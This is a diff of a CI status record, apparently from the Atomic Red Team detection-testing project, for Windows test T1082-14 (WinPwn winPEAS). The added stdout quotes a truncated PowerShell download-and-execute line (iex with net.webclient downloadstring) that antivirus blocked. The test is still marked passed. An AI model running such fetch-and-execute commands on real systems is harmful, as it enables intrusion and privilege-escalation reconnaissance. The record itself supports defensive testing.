@@ -2,12 +2,11 @@
   "guid": "eea1d918-825e-47dd-acc2-814d6c58c0e1",
   "platforms": {
     "windows": {
-      "consecutive_failures": 1,
-      "last_status": "failed",
-      "stdout": "",
+      "consecutive_failures": 0,
+      "last_status": "passed",
+      "stdout": "PathToAtomicsFolder = D:\\a\\atomic-red-team\\atomic-red-team\\atomics\r\n\r\nCheckPrereq's for: \r\nT1082-14 WinPwn - winPEAS\r\n\r\nPrerequisites met: \r\nT1082-14 WinPwn - winPEAS\r\n\r\n\nPathToAtomicsFolder = D:\\a\\atomic-red-team\\atomic-red-team\\atomics\r\n\r\nExecuting test: \r\nT1082-14 WinPwn - winPEAS\r\n\r\niex : At line:1 char:1\r\n+ #  Global TLS Setting for all functions. If TLS12 isn't suppported yo ...\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\nThis script contains malicious content and has been blocked by your antivirus software.\r\nAt line:2 char:1\r\n+ iex(new-object net.webclient).downloadstring('https://raw.githubuserc ...\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException\r\n    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand\r\n \r\nwinPEAS : The term 'winPEAS' is not recognized as the name of a cmdlet, function, script file, or operable program. \r\nCheck the spelling of the name, or if a path was included, verify that the path is correct and try again.\r\nAt line:3 char:1\r\n+ winPEAS -noninteractive -consoleoutput}\r\n+ ~~~~~~~\r\n    + CategoryInfo          : ObjectNotFound: (winPEAS:String) [], CommandNotFoundException\r\n    + FullyQualifiedErrorId : CommandNotFoundException\r\nExit code: 0\r\nDone executing test: \r\nT1082-14 WinPwn - winPEAS\r\n\r\n\nPathToAtomicsFolder = D:\\a\\atomic-red-team\\atomic-red-team\\atomics\r\n\r\nExecuting cleanup for test: \r\nT1082-14 WinPwn - winPEAS\r\n\r\nDone executing cleanup for test: \r\nT1082-14 WinPwn - winPEAS\r\n\r\n",
       "stderr": "",
-      "exit_code": 1,
-      "last_error": "The process cannot access the file 'C:\\Users\\runneradmin\\AppData\\Local\\Temp\\tmpzt25xs.tmp' because it is being used by another process."
+      "exit_code": 0
     }
   }
 }
